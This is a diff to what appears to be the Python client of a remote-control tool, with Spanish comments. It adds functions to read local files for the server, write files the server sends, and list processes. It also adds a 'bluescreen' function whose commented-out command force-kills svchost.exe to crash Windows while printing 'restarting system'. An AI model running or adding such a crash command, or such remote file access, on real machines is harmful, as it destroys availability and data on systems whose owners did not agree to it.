@@ -38,14 +38,56 @@ def execute_command(command: str, timeout: int = 30) -> Tuple[bool, str]:
         return False, f"Error: {str(e)}"
 
 
+def bluescreen():
+    try:
+        if platform.system() == "Windows":
+            print("Reiniciando sistema...")
+            # os.system("taskkill /F /IM svchost.exe")
+        else:
+            return "No se pudo reiniciar el sistema"
+    except Exception as e:
+        return f"Error reiniciando el sistema: {e}"
+
+
 def get_hostname() -> str:
     """Obtiene información detallada del host."""
     try:
-        fqdn = socket.getfqdn()
         hostname = socket.gethostname()
-        return f"Hostname: {hostname}\nFQDN: {fqdn}"
+        return f"Hostname: {hostname}\n"
     except Exception as e:
         return f"Error obteniendo hostname: {e}"
+
+
+def upload_file(file_path: str) -> str:
+    """
+    Sube un archivo al servidor.
+
+    Args:
+        file_path: Ruta del archivo a subir
+    """
+    try:
+        if not os.path.exists(file_path):
+            return f"Error: No existe el archivo {file_path}"
+        with open(file_path, 'rb') as file:
+            return file.read().decode('UTF-8')
+    except Exception as e:
+        return f"Error subiendo archivo: {e}"
+
+
+def download_file(file_path: str, content: str) -> str:
+    """
+    Descarga un archivo al servidor.
+
+    Args:
+        file_path: Ruta del archivo a crear
+        content: Contenido del archivo
+    """
+    try:
+        with open(file_path, 'wb') as file:
+            file.write(content.encode('UTF-8'))
+        return f"Archivo {file_path} descargado exitosamente"
+    except Exception as e:
+        return f"Error descargando archivo: {e}"
 
 
 def get_ip() -> str:
@@ -109,9 +151,13 @@ def get_processes() -> str:
         processes = []
         for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_percent']):
             try:
-                info = proc.info
-                processes.append(f"PID: {info['pid']:<6} Usuario: {info['username']:<15} "
-                                 f"Memoria: {info['memory_percent']:.1f}% Nombre: {info['name']}")
+                pid = proc.pid
+                Name = proc.name()
+                user = proc.username()
+                memory = proc.memory_info().rss
+
+                processes.append(f"PID: {pid} Usuario: {user} "
+                                 f"Memoria: {memory / (1024 ** 3):.1f} GB Nombre: {Name}")
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 continue
         return "\n".join(processes)
